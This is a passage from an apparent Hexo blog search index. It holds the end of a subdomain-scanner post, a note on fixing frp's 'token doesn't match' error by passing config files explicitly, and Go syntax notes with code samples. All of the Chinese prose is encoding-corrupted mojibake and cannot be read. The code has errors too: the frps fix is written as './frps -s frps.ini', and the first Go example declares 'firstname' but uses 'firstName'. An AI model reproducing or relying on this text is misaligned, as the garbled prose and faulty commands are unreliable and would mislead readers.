è¿›å…¥è°ƒè¯•æ¨¡å¼ï¼Œè§‚å¯Ÿç¨‹åºè¡Œä¸º</span><br><span class="line">  --silent              å‡å°‘ç¨‹åºè¾“å‡ºï¼Œåªè¾“å‡ºç ´è§£æˆåŠŸçš„æ¡ç›®</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>æ‰«æå™¨</tag>
        <tag>å­åŸŸæ‰«æ</tag>
      </tags>
  </entry>
  <entry>
    <title>frpçš„token does note matché—®é¢˜</title>
    <url>/2021/11/20/frp%E7%9A%84token-does-note-match%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p>ä»Šå¤©æ–°æ‹‰äº†ä¸€ä¸ªfrpçš„ç‰ˆæœ¬è£…åœ¨è…¾è®¯äº‘çš„å°é¸¡ä¸Šï¼Œç„¶åæµ‹è¯•äº†ä¸€ä¸‹å‘ç°å’‹é…ç½®éƒ½ä¸èƒ½ä½¿tokenä¸¤è¾¹åŒ¹é…</p>
<p>ç–¯ç‹‚ç»™æˆ‘æŠ¥è¿™ä¸ªé”™è¯¯</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637391097972-2021-11-2014:51:37.png" alt="æœåŠ¡ç«¯"></p>
<blockquote>
<p>register control error: token in login doesnâ€™t match token from configuration</p>
</blockquote>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637391142808-2021-11-2014:52:22.png" alt="å®¢æˆ·ç«¯"></p>
<blockquote>
<p>login to server failed: token in login doesnâ€™t match token from configuration token in login doesnâ€™t match token from configuration</p>
</blockquote>
<p>ç„¶åæˆ‘æ‡µäº†ï¼Œç™¾æ€çš„ä¸å¾—å…¶è§£ï¼Œç›¯ç€tokençœ‹äº†å¥½å‡ éå®Œå…¨ä¸€æ ·å•Š</p>
<span id="more"></span>

<h2 id="åŸå› "><a href="#åŸå› " class="headerlink" title="åŸå› "></a>åŸå› </h2><p>æœä¸­æ–‡æœäº†åŠå¤©æ²¡ç­”æ¡ˆï¼Œ</p>
<p>ç›´æ¥æŠŠæŠ¥é”™ä¿¡æ¯è´´è¿›googleï¼Œoooooh f**K</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637391308907-2021-11-2014:55:08.png"></p>
<p>æˆ‘åœ¨å®˜æ–¹çš„issueå»æ‰¾åˆ°äº†é—®é¢˜çš„æ‰€åœ¨ï¼Œ</p>
<p>æˆ‘çš„å¯åŠ¨å‘½ä»¤éƒ½æ˜¯</p>
<p><code>./frp[s/c]</code>ç›´æ¥é»˜è®¤é…ç½®å¯åŠ¨çš„</p>
<p><strong>è€Œfrpcä¼šä½¿ç”¨<code>frpc.ini</code>ä½œä¸ºé»˜è®¤çš„é…ç½®æ–‡ä»¶</strong></p>
<p><strong>è€Œfrpsä¸ä¼šæŠŠ<code>frps.ini</code>ä½œä¸ºé»˜è®¤çš„é…ç½®æ–‡ä»¶</strong></p>
<p>æˆ‘äººå‚»äº†ï¼Œä¹‹å‰ç”¨çš„ç‰ˆæœ¬æ²¡é‡åˆ°è¿‡è¿™ä¸ªé—®é¢˜</p>
<p>è®°å½•ä¸€ä¸‹</p>
<h2 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h2><p>çŸ¥é“äº†åŸå› ï¼Œè§£å†³æ–¹æ³•å°±å¾ˆç®€å•äº†</p>
<p>å¯åŠ¨çš„æ—¶å€™å…¨éƒ¨åŠ ä¸Šé…ç½®æ–‡ä»¶å‘—</p>
<p>å®¢æˆ·ç«¯(ä¸»è¦æ˜¯æœåŠ¡ç«¯è¦æ”¹ï¼Œå®¢æˆ·ç«¯ç›´æ¥å¯åŠ¨æ²¡é—®é¢˜)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure>

<p>æœåŠ¡ç«¯</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./frps -s frps.ini</span><br></pre></td></tr></table></figure>



<p>ç»ˆäºæ­£å¸¸äº†..</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637391616818-2021-11-2015:00:16.png"></p>
]]></content>
      <tags>
        <tag>è¸©å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>GOè¯­æ³•ç¬”è®°</title>
    <url>/2021/11/06/go/</url>
    <content><![CDATA[<h1 id="goè¯­æ³•ç¬”è®°"><a href="#goè¯­æ³•ç¬”è®°" class="headerlink" title="goè¯­æ³•ç¬”è®°"></a>goè¯­æ³•ç¬”è®°</h1><span id="more"></span>

<ul>
<li><p>hello world</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> firstname <span class="keyword">string</span></span><br><span class="line">    fmt.Scanln(&amp;firstName)</span><br><span class="line">	fmt.Println(firstName)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Printlnçš„péœ€è¦å¤§å†™</span></span><br><span class="line"><span class="comment">//å‘½ä»¤è¡Œè¿è¡Œgo run æ–‡ä»¶å</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><code>println</code> is an built-in function (into the runtime) which may eventually be removed, while the <code>fmt</code> package is in the standard library, which will persist. See <a href="http://golang.org/ref/spec#Bootstrapping">the spec</a> on that topic.</p>
<p>For language developers it is handy to have a <code>println</code> without dependencies, but the way to go is to use the <code>fmt</code> package or something similar (<code>log</code> for example).</p>
<h3 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h3><ul>
<li><p>å®šä¹‰å˜é‡</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> firstName <span class="keyword">string</span></span><br><span class="line"><span class="comment">//æˆ–è€…ç›´æ¥ä¸æŒ‡å®šå˜é‡ç±»å‹ç›´æ¥èµ‹å€¼ï¼Œgoä¼šè‡ªå·±æ¨æ–­</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">firstName,lastName =  <span class="string">&quot;harry&quot;</span>,<span class="string">&quot;smith&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä½¿ç”¨:=èµ‹å€¼ï¼Œè¦å£°æ˜çš„å˜é‡å¿…é¡»æ˜¯æ–°å˜é‡ã€‚ å¦‚æœä½¿ç”¨å†’å·ç­‰äºå·å¹¶å·²ç»å£°æ˜è¯¥å˜é‡ï¼Œå°†ä¸ä¼šå¯¹ç¨‹åºè¿›è¡Œç¼–è¯‘ã€‚ </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    firstName, lastName := <span class="string">&quot;John&quot;</span>, <span class="string">&quot;Doe&quot;</span></span><br><span class="line">    fmt.Println(firstName, lastName)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>å®šä¹‰å¸¸é‡</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> httpstatus = <span class="number">200</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    StatusOK              = <span class="number">0</span></span><br><span class="line">    StatusConnectionReset = <span class="number">1</span></span><br><span class="line">    StatusOtherError      = <span class="number">2</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">//ä¸èƒ½ä½¿ç”¨å†’å·ç­‰äºå·æ¥å£°æ˜å¸¸é‡  </span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>å¦‚æœå˜é‡å®šä¹‰äº†æœªä½¿ç”¨goä¼šæŠ›å‡ºé”™è¯¯</p>
<h3 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h3><p>Go æœ‰å››ç±»æ•°æ®ç±»å‹ï¼š</p>
<ul>
<li>åŸºæœ¬ç±»å‹ï¼šæ•°å­—ã€å­—ç¬¦ä¸²å’Œå¸ƒå°”å€¼</li>
<li>èšåˆç±»å‹ï¼šæ•°ç»„å’Œç»“æ„</li>
<li>å¼•ç”¨ç±»å‹ï¼šæŒ‡é’ˆã€åˆ‡ç‰‡ã€æ˜ å°„ã€å‡½æ•°å’Œé€šé“</li>
<li>æ¥å£ç±»å‹ï¼šæ¥å£</li>
</ul>
<h4 id="æ•°å­—"><a href="#æ•°å­—" class="headerlink" title="æ•°å­—"></a>æ•°å­—</h4><p>ä¸€èˆ¬ä½¿ç”¨ã€€<strong>int</strong> ï¼ˆå½“è®¡ç®—æœºæ˜¯32ä½æ—¶è¡¨ç¤º32ä½çš„int , 64ä½æ—¶ä½64ä½intï¼‰</p>
<p>Go è¿˜æä¾›äº† <code>int8</code>ã€<code>int16</code>ã€<code>int32</code> å’Œ <code>int64</code> ç±»å‹ï¼Œå…¶å¤§å°åˆ†åˆ«ä¸º 8ã€16ã€32 æˆ– 64 ä½çš„æ•´æ•°</p>
<p>åªæœ‰<strong>float32</strong> <strong>float64</strong>ä¸¤ç§</p>
<h4 id="å¸ƒè€³"><a href="#å¸ƒè€³" class="headerlink" title="å¸ƒè€³"></a>å¸ƒè€³</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// goçš„boolç±»å‹åªèƒ½ç”¨äºæ˜¾å¼èµ‹å€¼ï¼Œ0,1ä¸èƒ½æ ‡è¯†å¯¹åº”çš„å¸ƒè€³å€¼</span></span><br><span class="line"><span class="keyword">var</span> flag <span class="keyword">bool</span> = <span class="literal">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h4 id="å­—ç¬¦ä¸²"><a href="#å­—ç¬¦ä¸²" class="headerlink" title="å­—ç¬¦ä¸²"></a>å­—ç¬¦ä¸²</h4><p>string</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">fullName := <span class="string">&quot;John Doe \t(alias \&quot;Foo\&quot;)\n&quot;</span></span><br><span class="line">fmt.Println(fullName)</span><br></pre></td></tr></table></figure>



<ul>
<li><p>è½¬æ¢</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ä½¿ç”¨è‡ªå¸¦çš„å‡½æ•°è½¬æ¢</span></span><br><span class="line"><span class="keyword">var</span> integer16 <span class="keyword">int16</span> = <span class="number">127</span></span><br><span class="line"><span class="keyword">var</span> integer32 <span class="keyword">int32</span> = <span class="number">32767</span></span><br><span class="line">fmt.Println(<span class="keyword">int32</span>(integer16) + integer32)</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä½¿ç”¨strconvåŒ…æ¥è½¬æ¢</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;strconv&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    i, _ := strconv.Atoi(<span class="string">&quot;-42&quot;</span>)</span><br><span class="line">    s := strconv.Itoa(<span class="number">-42</span>)</span><br><span class="line">    fmt.<span class="built_in">println</span>(i, s)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä¸‹åˆ’çº¿ (_) ç”¨ä½œå˜é‡çš„åç§°ï¼ˆå¦‚æœä»–æ˜¯å˜é‡ç¨‹åºæ²¡æ³•ç¼–è¯‘ï¼Œå› ä¸ºå˜é‡éœ€è¦ç”¨åˆ°ä½¿ç”¨æ‰èƒ½é€šè¿‡ç¼–è¯‘ï¼‰ã€‚ åœ¨ Go ä¸­ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬ä¸ä¼šä½¿ç”¨è¯¥å˜é‡çš„å€¼ï¼Œè€Œæ˜¯è¦å°†å…¶å¿½ç•¥ã€‚</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>å˜é‡é»˜è®¤å€¼</strong></p>
<ul>
<li><code>int</code> ç±»å‹çš„ <code>0</code>ï¼ˆåŠå…¶æ‰€æœ‰å­ç±»å‹ï¼Œå¦‚ <code>int64</code>ï¼‰</li>
<li><code>float32</code> å’Œ <code>float64</code> ç±»å‹çš„ <code>+0.000000e+000</code></li>
<li><code>bool</code> ç±»å‹çš„ <code>false</code></li>
<li><code>string</code> ç±»å‹çš„ç©ºå€¼</li>
</ul>
<h4 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h4><p>è¦åœ¨ Go ä¸­å£°æ˜æ•°ç»„ï¼Œå¿…é¡»å®šä¹‰å…¶å…ƒç´ çš„æ•°æ®ç±»å‹ä»¥åŠè¯¥æ•°ç»„å¯å®¹çº³çš„å…ƒç´ æ•°ç›®ã€‚ ç„¶åï¼Œå¯é‡‡ç”¨ä¸‹æ ‡è¡¨ç¤ºæ³•è®¿é—®æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ 0ï¼Œæœ€åä¸€ä¸ªå…ƒç´ æ˜¯æ•°ç»„é•¿åº¦å‡å» 1ï¼ˆé•¿åº¦ - 1ï¼‰ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a [<span class="number">3</span>]<span class="keyword">int</span></span><br><span class="line">a[<span class="number">1</span>] = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç»™æ•°ç»„åˆå§‹å€¼</span></span><br><span class="line">cities := [<span class="number">5</span>]<span class="keyword">string</span>&#123;<span class="string">&quot;New York&quot;</span>, <span class="string">&quot;Paris&quot;</span>, <span class="string">&quot;Berlin&quot;</span>, <span class="string">&quot;Madrid&quot;</span>&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;Cities:&quot;</span>, cities)</span><br><span class="line"><span class="comment">//æ”¯æŒå¤šç»´æ•°ç»„æ˜¯</span></span><br><span class="line"><span class="keyword">var</span> twoD [<span class="number">3</span>][<span class="number">5</span>]<span class="keyword">int</span></span><br></pre></td></tr></table></figure>

<h4 id="slice"><a href="#slice" class="headerlink" title="slice"></a>slice</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">months := []<span class="keyword">string</span>&#123;<span class="string">&quot;January&quot;</span>, <span class="string">&quot;February&quot;</span>, <span class="string">&quot;March&quot;</span>, <span class="string">&quot;April&quot;</span>, <span class="string">&quot;May&quot;</span>, <span class="string">&quot;June&quot;</span>, <span class="string">&quot;July&quot;</span>, <span class="string">&quot;August&quot;</span>, <span class="string">&quot;September&quot;</span>, <span class="string">&quot;October&quot;</span>, <span class="string">&quot;November&quot;</span>, <span class="string">&quot;December&quot;</span>&#125;</span><br><span class="line">quarter1 := months[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">quarter2 := months[<span class="number">3</span>:<span class="number">6</span>]</span><br><span class="line">quarter3 := months[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">quarter4 := months[<span class="number">9</span>:<span class="number">12</span>]</span><br><span class="line"><span class="comment">//lenå‡½æ•°ä¸ºé•¿åº¦ï¼Œcapä¸ºå®¹é‡ä¼šè‡ªåŠ¨å‘åæ‹“å±•ç›´åˆ°æ•´ä¸ªæ•°ç»„</span></span><br><span class="line">fmt.Println(quarter1, <span class="built_in">len</span>(quarter1), <span class="built_in">cap</span>(quarter1))</span><br><span class="line">fmt.Println(quarter2, <span class="built_in">len</span>(quarter2), <span class="built_in">cap</span>(quarter2))</span><br><span class="line">fmt.Println(quarter3, <span class="built_in">len</span>(quarter3), <span class="built_in">cap</span>(quarter3))</span><br><span class="line">fmt.Println(quarter4, <span class="built_in">len</span>(quarter4), <span class="built_in">cap</span>(quarter4))</span><br><span class="line"></span><br><span class="line"><span class="comment">//output</span></span><br><span class="line">[January February March] <span class="number">3</span> <span class="number">12</span></span><br><span class="line">[April May June] <span class="number">3</span> <span class="number">9</span></span><br><span class="line">[July August September] <span class="number">3</span> <span class="number">6</span></span><br><span class="line">[October November December] <span class="number">3</span> <span class="number">3</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>append(åŸæ•°ç»„ï¼Œæ·»åŠ å…ƒç´ )</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹“å±•åˆ‡ç‰‡çš„capacity å‡½æ•°append()</span></span><br><span class="line"> <span class="keyword">var</span> numbers []<span class="keyword">int</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        numbers = <span class="built_in">append</span>(numbers, i)</span><br><span class="line">        fmt.Printf(<span class="string">&quot;%d\tcap=%d\t%v\n&quot;</span>, i, <span class="built_in">cap</span>(numbers), numbers)</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//è¾“å‡º</span></span><br><span class="line"><span class="number">0</span>       <span class="built_in">cap</span>=<span class="number">1</span>   [<span class="number">0</span>]</span><br><span class="line"><span class="number">1</span>       <span class="built_in">cap</span>=<span class="number">2</span>   [<span class="number">0</span> <span class="number">1</span>]</span><br><span class="line"><span class="number">2</span>       <span class="built_in">cap</span>=<span class="number">4</span>   [<span class="number">0</span> <span class="number">1</span> <span class="number">2</span>]</span><br><span class="line"><span class="number">3</span>       <span class="built_in">cap</span>=<span class="number">4</span>   [<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span>]</span><br><span class="line"><span class="number">4</span>       <span class="built_in">cap</span>=<span class="number">8</span>   [<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span>]</span><br><span class="line"><span class="number">5</span>       <span class="built_in">cap</span>=<span class="number">8</span>   [<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span>]</span><br><span class="line"><span class="number">6</span>       <span class="built_in">cap</span>=<span class="number">8</span>   [<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span>]</span><br><span class="line"><span class="number">7</span>       <span class="built_in">cap</span>=<span class="number">8</span>   [<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span>]</span><br><span class="line"><span class="number">8</span>       <span class="built_in">cap</span>=<span class="number">16</span>  [<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span>]</span><br><span class="line"><span class="number">9</span>       <span class="built_in">cap</span>=<span class="number">16</span>  [<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span>]</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">å½“åˆ‡ç‰‡å®¹é‡ä¸è¶³ä»¥å®¹çº³æ›´å¤šå…ƒç´ æ—¶ï¼ŒGo çš„å®¹é‡å°†ç¿»å€ã€‚ å®ƒå°†æ–°å»ºä¸€ä¸ªå…·æœ‰æ–°å®¹é‡çš„åŸºç¡€æ•°ç»„ã€‚ æ— éœ€æ‰§è¡Œä»»ä½•æ“ä½œå³å¯ä½¿å®¹é‡å¢åŠ ã€‚ Go ä¼šè‡ªåŠ¨æ‰©å……å®¹é‡ã€‚ éœ€è¦è°¨æ…æ“ä½œã€‚ æœ‰æ—¶ï¼Œä¸€ä¸ªåˆ‡ç‰‡å…·æœ‰çš„å®¹é‡å¯èƒ½æ¯”å®ƒéœ€è¦çš„å¤šå¾—å¤šï¼Œè¿™æ ·ä½ å°†ä¼šæµªè´¹å†…å­˜ã€‚*/</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>åˆ é™¤åˆ‡ç‰‡ä¸­çš„å…ƒç´ ï¼Œåªèƒ½ç”¨append()æ¥å®ç°</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">a := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br><span class="line">a = <span class="built_in">append</span>(a[:<span class="number">2</span>], a[<span class="number">3</span>:]...)</span><br><span class="line"><span class="comment">//åˆ é™¤äº†å…ƒç´ å€¼&#x27;2&#x27;çš„å…ƒç´ </span></span><br><span class="line"><span class="comment">//[1 2 4 5 6]</span></span><br></pre></td></tr></table></figure></li>
<li><p>åˆ›å»ºå‰¯æœ¬ã€€</p>
<p>Go å…·æœ‰å†…ç½®å‡½æ•° <code>copy(dst, src []Type)</code> ç”¨äºåˆ›å»ºåˆ‡ç‰‡çš„å‰¯æœ¬ã€‚ ä½ éœ€è¦å‘é€ç›®æ ‡åˆ‡ç‰‡å’Œæºåˆ‡ç‰‡ã€‚</p>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">letters := []<span class="keyword">string</span>&#123;<span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;E&quot;</span>&#125;</span><br><span class="line">slice2 := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">3</span>)</span><br><span class="line"><span class="built_in">copy</span>(slice2, letters[<span class="number">1</span>:<span class="number">4</span>])</span><br><span class="line">fmt.Println(slice2)</span><br><span class="line"><span class="comment">// [B C D]</span></span><br></pre></td></tr></table></figure>



<h4 id="map-key-value"><a href="#map-key-value" class="headerlink" title="map(key-value)"></a>map(key-value)</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">  studentsAge := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>&#123;</span><br><span class="line">        <span class="string">&quot;john&quot;</span>: <span class="number">32</span>,</span><br><span class="line">        <span class="string">&quot;bob&quot;</span>:  <span class="number">31</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(studentsAge)</span><br><span class="line"><span class="comment">//map[bob:31 john:32]</span></span><br></pre></td></tr></table></figure>

<p>mapæ“ä½œ</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//åˆ›å»ºä¸€ä¸ªç©ºçš„map</span></span><br><span class="line">studentsAge := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ›å»ºæ–°é¡¹</span></span><br><span class="line">studentsAge[<span class="string">&quot;john&quot;</span>] = <span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ¤æ–­æ˜¯å¦å­˜åœ¨mapä¸­</span></span><br><span class="line">studentsAge := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>)</span><br><span class="line">studentsAge[<span class="string">&quot;john&quot;</span>] = <span class="number">32</span></span><br><span class="line">studentsAge[<span class="string">&quot;bob&quot;</span>] = <span class="number">31</span></span><br><span class="line"></span><br><span class="line">age, exist := studentsAge[<span class="string">&quot;christy&quot;</span>]</span><br><span class="line"><span class="keyword">if</span> exist &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Christy&#x27;s age is&quot;</span>, age)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Christy&#x27;s age couldn&#x27;t be found&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ é™¤é¡¹</span></span><br><span class="line"><span class="built_in">delete</span>(studentAge,<span class="string">&quot;john&quot;</span>)</span><br><span class="line"><span class="comment">//åˆ é™¤ä¸å­˜åœ¨çš„é¡¹ï¼Œä½ ä¸ä¼šé‡åˆ°é”™è¯¯ï¼Œè€Œä¸”ä¼šçœ‹åˆ°ä»¥ä¸‹è¾“å‡ºï¼šmap[bob:31 john:32]</span></span><br><span class="line"><span class="built_in">delete</span>(studentsAge, <span class="string">&quot;christy&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//éå†map</span></span><br><span class="line"><span class="keyword">for</span> name, age := <span class="keyword">range</span> studentsAge &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;%s\t%d\n&quot;</span>, name, age)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ ¼å¼ï¼Œç±»ä¼¼cè¯­è¨€çš„ç»“æ„ä½“</span></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">	ID        <span class="keyword">int</span></span><br><span class="line">	FirstName <span class="keyword">string</span></span><br><span class="line">	LastName  <span class="keyword">string</span></span><br><span class="line">	Address   <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯ä»¥ç†è§£æˆ ç»§æ‰¿ï¼Œæˆ–è€…åµŒå¥—ï¼ŒEmployeeä¸­åµŒå¥—äº†Personçš„ç»“æ„ä½“</span></span><br><span class="line"><span class="keyword">type</span> Employee <span class="keyword">struct</span> &#123;</span><br><span class="line">	Person</span><br><span class="line">	ManagerID <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Contractor <span class="keyword">struct</span> &#123;</span><br><span class="line">	Person</span><br><span class="line">	CompanyID <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	employee := Employee&#123;&#125;</span><br><span class="line">	employee.LastName = <span class="string">&quot;Doe&quot;</span></span><br><span class="line">	fmt.Println(employee.LastName)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Doe</span></span><br></pre></td></tr></table></figure>





<h4 id="jsonåºåˆ—åŒ–åŠå…¶ååºåˆ—åŒ–"><a href="#jsonåºåˆ—åŒ–åŠå…¶ååºåˆ—åŒ–" class="headerlink" title="jsonåºåˆ—åŒ–åŠå…¶ååºåˆ—åŒ–"></a>jsonåºåˆ—åŒ–åŠå…¶ååºåˆ—åŒ–</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">	ID        <span class="keyword">int</span></span><br><span class="line">    <span class="comment">/*è¿™é‡Œçš„åå¼•å·éƒ¨åˆ†æ˜¯struct tag,å¯ä»¥å†³å®šåºåˆ—åŒ–çš„ç»“æœ</span></span><br><span class="line"><span class="comment">    æ¯”å¦‚è¿™é‡ŒFirstNameå†™äº†name</span></span><br><span class="line"><span class="comment">    å½“åºåˆ—åŒ–æˆjsonçš„æ—¶å€™keyå€¼å°±ä¼šå˜æˆnameè€Œä¸æ˜¯FirstName</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	FirstName <span class="keyword">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">	LastName  <span class="keyword">string</span></span><br><span class="line">    <span class="comment">//è¿™é‡Œçš„omitemptyå«ä¹‰æ˜¯çœç•¥ï¼Œå½“addressä¸ºvalueç©ºæ—¶ï¼Œçœç•¥è¿™ä¸ªé”®å€¼å¯¹</span></span><br><span class="line">	Address   <span class="keyword">string</span> <span class="string">`json:&quot;address,omitempty&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Employee <span class="keyword">struct</span> &#123;</span><br><span class="line">	Person</span><br><span class="line">	ManagerID <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Contractor <span class="keyword">struct</span> &#123;</span><br><span class="line">	Person</span><br><span class="line">	CompanyID <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	employees := []Employee&#123;</span><br><span class="line">		&#123;</span><br><span class="line">			Person: Person&#123;</span><br><span class="line">				LastName: <span class="string">&quot;Doe&quot;</span>, FirstName: <span class="string">&quot;John&quot;</span>, Address: <span class="string">&quot;balabala&quot;</span>,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		&#123;</span><br><span class="line">			Person: Person&#123;</span><br><span class="line">				LastName: <span class="string">&quot;Campbell&quot;</span>, FirstName: <span class="string">&quot;David&quot;</span>,</span><br><span class="line">			